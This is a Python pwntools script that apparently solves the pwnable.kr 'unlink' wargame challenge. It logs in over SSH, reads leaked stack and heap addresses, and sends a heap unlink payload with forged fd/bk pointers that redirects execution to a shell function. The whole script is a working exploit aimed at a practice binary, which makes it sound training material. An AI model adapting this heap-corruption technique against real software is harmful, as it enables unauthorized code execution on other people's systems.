from pwn import *

s = ssh(user='unlink',host='pwnable.kr',port=2222,password='guest')
conn = s.process("./unlink")
#conn = process("./unlink")

conn.recvuntil("here is stack address leak: ")
stack_addr = int(conn.recvline().strip(),16)
ret_addr = stack_addr+40

conn.recvuntil("here is heap address leak: ")
heap_addr = int(conn.recvline().strip(),16)
log.info("stack : "+hex(ret_addr))
log.info("heap  : "+hex(heap_addr))

shell_address = 0x80484eb
ebp_addr = stack_addr-0x1c
fake_ebp = heap_addr+16

payload = p32(shell_address)+p32(fake_ebp-4)+"A"*8
payload += p32(fake_ebp) #fd  fd+4=bk
payload += p32(ebp_addr) #bk  bk = fd

conn.sendline(payload)

conn.interactive()
